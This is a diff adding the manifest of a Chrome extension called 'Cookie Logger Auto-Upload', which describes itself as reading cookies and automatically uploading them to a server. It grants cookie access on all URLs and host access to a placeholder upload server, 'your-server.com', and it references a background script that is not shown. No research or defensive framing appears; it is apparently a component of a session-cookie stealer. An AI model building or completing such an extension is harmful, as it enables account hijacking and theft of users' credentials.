@@ -1,0 +1,22 @@
+{
+  "manifest_version": 3,
+  "name": "Cookie Logger Auto-Upload",
+  "version": "1.3",
+  "description": "Reads cookies and uploads them automatically to a server",
+  "permissions": [
+    "cookies",
+    "alarms"
+  ],
+  "host_permissions": [
+    "<all_urls>",
+    "http://your-server.com/*"
+  ],
+  "background": {
+    "service_worker": "background.js",
+    "type": "module"
+  },
+  "action": {
+    "default_title": "Cookie Logger",
+    "default_popup": "popup.html"
+  }
+}
